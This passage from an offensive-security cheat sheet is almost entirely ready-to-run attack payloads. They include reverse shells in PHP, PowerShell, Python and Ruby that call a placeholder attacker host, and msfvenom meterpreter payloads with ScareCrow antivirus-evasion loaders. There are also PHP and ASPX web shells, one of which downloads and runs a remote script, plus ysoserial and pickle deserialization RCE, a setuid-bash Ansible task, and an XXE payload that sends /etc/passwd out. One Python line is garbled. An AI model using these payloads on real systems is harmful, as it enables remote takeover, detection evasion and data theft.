php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

##### PowerShell Reverse Shell

```c
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```c
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```c
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

##### minireverse.ps1

```c
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

##### Python Reverse Shell

```c
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```

```c
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

##### Ruby Reverse Shell

```c
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### ScareCrow

##### Payloads

###### Shellcode Payload Creation with msfvenom

```c
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
```

###### .msi-File Payload Creation with msfvenom

```c
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
```

##### Listener

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
```

##### Obfuscation

###### DLL Side-Loading

```c
ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
```
###### Windows Script Host

```c
ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
```

###### Control Panel Files

```c
ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
```

##### Renaming Payload

```c
mv <FILE>.dll <FILE>32.dll
```

##### Execution

```c
rundll32.exe .\<FILE>32.dll,DllRegisterServer
```

or

```c
regsvr32 /s .\<FILE>32.dll
```

For `.cpl-Files` a simple double click is enough to execute them.

#### Shikata Ga Nai

```c
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
```

#### Web Shells

##### PHP Web Shell

```c
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

#### ysoserial

```c
java -jar ysoserial-master-SNAPSHOT.jar
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
```

### Templates

#### ASPX Web Shell

```c
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

#### Bad YAML

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

#### Exploit Skeleton Python Script

```c
#!/usr/bin/python

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

#### JSON POST Request

```c
POST /<path> HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 95
Connection: close

{
  "auth":{
    "name":"<USERNAME>",
    "password":"<PASSWORD>"
  },
  "filename":"<FILE>"
}
```

#### Python Pickle RCE

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> <LHOST> > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

```python
import base64
import pickle
import os

class RCE:
	def __reduce__(self):
		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
		return = os.system, (cmd, )

if __name__ == '__main__':
	pickle = pickle.dumps(RCE())
	print(bas64.b64encode(pickled))
```

#### Python Redirect for SSRF

```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
```

```c
sudo python3 redirect.py http://127.0.0.1:3000/
```

```python
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

#### Python Web Request

```python
import requests
import re

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }
// get a session
r = requests.get('http://')
// send request
r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
```

#### XML External Entity (XXE)

##### Request

```c
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username><NAME>;</username>
<password><NAME></password>
</user>
</root>
```

##### Content of <FILE>.dtd

```c
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
%eval;
%exfiltrate;
```
